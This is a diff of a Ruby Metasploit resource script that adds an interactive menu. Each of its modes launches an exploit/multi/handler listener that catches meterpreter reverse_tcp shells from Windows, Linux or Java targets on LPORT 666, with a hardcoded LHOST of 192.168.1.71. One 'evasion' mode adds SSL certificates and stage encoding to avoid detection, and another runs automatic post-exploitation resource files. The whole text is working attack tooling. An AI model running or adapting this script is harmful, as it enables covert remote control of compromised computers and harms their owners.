@@ -2,44 +2,144 @@
    help = %Q|
 
     Description:
-      Resource File to get the LHOST variable from
-      user input and start one msf multi/handler with
+      Resource File to start one msf multi/handler with
       AutoRunScript option pointing to our resource file.
+      Or just start a simple or evasion msf multi/handler.
 
     Author:
        r00t-3xp10it  <pedroubuntu10[at]gmail.com>
-
    |
    print_line(help)
-   Rex::sleep(1.0)
-   print "Input LHOST: "
+   Rex::sleep(0.5)
+   menu = %Q|
+    Command       Description                 platform
+    -------       -----------                 --------      
+    handler       simple multi/handler        multi
+    resource      handler with AutoRunScript  multi
+    evasion       handler with stage encoding multi
 
-      ## 'gets' is used to get the LHOST variable from user input, but appends on it the
-      # trailing new line character i.e.'\n' in the end of the string. 'chomp' is the method
-      # to remove the trailing new line character i.e. '\n' from the end of the string.
-      get_addr = gets.chomp
-      print "Input platform to exploit (Windows|Linux): "
-      get_os = gets.chomp
-      print "Input resouce file absoluct path: "
+   |
+   print_line(menu)
+   Rex::sleep(0.5)
+   print "[Command]: "
+      user_input = gets.chomp
+
+
+      ## SIMPLE MULTI/HANDLER
+      if user_input == "handler"
+      ## User inputs
+      print "[+] Input platform to exploit (Windows|Linux|Java): "
+      user_platform = gets.chomp
+      unless user_platform =~ /(Windows|Linux|Java)/i
+         print_error("Platform NOT supported: #{user_platform}")
+         run_single("back")
+         return nil
+      end
+      print "[+] Use 192.168.1.71 as LHOST (y/n)?: "
+      get_host = gets.chomp
+         ## Sellect LHOST ip addr
+         if get_host == "y" or get_host == "Y"
+            remote_host = "192.168.1.71"
+         else
+            print "[+] Input LHOST: "
+            get_addr = gets.chomp
+            remote_host = "#{get_addr}"
+         end
+
+
+      ## MULTI/HANDLER AUTORUNSCRIPT
+      elsif user_input == "resource"
+      ## User inputs
+      print "[+] Input platform to exploit (Windows|Linux|Java): "
+      user_platform = gets.chomp
+      unless user_platform =~ /(Windows|Linux|Java)/i
+         print_error("Platform NOT supported: #{user_platform}")
+         run_single("back")
+         return nil
+      end
+      print "[+] Use 192.168.1.71 as LHOST (y/n)?: "
+      get_host = gets.chomp
+         ## Sellect LHOST ip addr
+         if get_host == "y" or get_host == "Y"
+            remote_host = "192.168.1.71"
+         else
+            print "[+] Input LHOST: "
+            get_addr = gets.chomp
+            remote_host = "#{get_addr}"
+         end
+      print "[+] Input resouce file absoluct path: "
       get_path = gets.chomp
+      ## Make sure that resource file exists (local)
+      unless (File.exist?(get_path))
+         print_error("Absoluct path NOT found: #{get_path}")
+         run_single("back")
+         return nil
+      end
 
 
-      # sellect session platform (payload)
-      if (get_os =~ /Windows/i)  
+      elsif user_input == "evasion"
+      ## User inputs
+      print "[+] Input platform to exploit (Windows|Linux|Java): "
+      user_platform = gets.chomp
+      unless user_platform =~ /(Windows|Linux|Java)/i
+         print_error("Platform NOT supported: #{user_platform}")
+         run_single("back")
+         return nil
+      end
+      print "[+] Use 192.168.1.71 as LHOST (y/n)?: "
+      get_host = gets.chomp
+         ## Sellect LHOST ip addr
+         if get_host == "y" or get_host == "Y"
+            remote_host = "192.168.1.71"
+         else
+            print "[+] Input LHOST: "
+            get_addr = gets.chomp
+            remote_host = "#{get_addr}"
+         end
+      print "[+] Input PEM file absoluct path: "
+      get_pem = gets.chomp
+      ## Make sure that PEM.pem file exists (local)
+      unless (File.exist?(get_pem))
+         print_error("cert.pem Absoluct path NOT found: #{get_pem}")
+         run_single("back")
+         return nil
+      end
+
+
+      ## USER INPUT ERROR
+      else
+      print_error("Command NOT supported: #{user_input}")
+      run_single("back")
+      return nil
+      end
+
+
+      ## Sellect session platform (payload)
+      if (user_platform =~ /Windows/i)  
          payload = "windows/meterpreter/reverse_tcp"
-      elsif (get_os =~ /Linux/i)
+      elsif (user_platform =~ /Linux/i)
          payload = "linux/x86/meterpreter/reverse_tcp"
       else
          payload = "java/meterpreter/reverse_tcp"
       end
 
 
+      ## Start multi/handler
+      print_line("")
       run_single("use exploit/multi/handler")
-      ## set AutoRunScript option to run our resource file
-      run_single("set AutoRunScript multi_console_command -r #{get_path}")
+         if user_input == "resource" or user_input == "RESOURCE"
+            ## set AutoRunScript option to run our resource file
+            run_single("set AutoRunScript multi_console_command -r #{get_path}")
+         end
       run_single("set PAYLOAD #{payload}")
+         ## set evasion options
+         if user_input == "evasion" or user_input == "Evasion"
+            run_single("set HandlerSSLCert #{get_pem}")
+            run_single("set StagerVerifySSLCert true")
+            run_single("set EnableStageEncoding true")
+         end
       run_single("set ExitOnSession false")
-      run_single("set LHOST #{get_addr}")
+      run_single("set LHOST #{remote_host}")
       run_single("set LPORT 666")
    run_single("exploit")
    run_single("back")
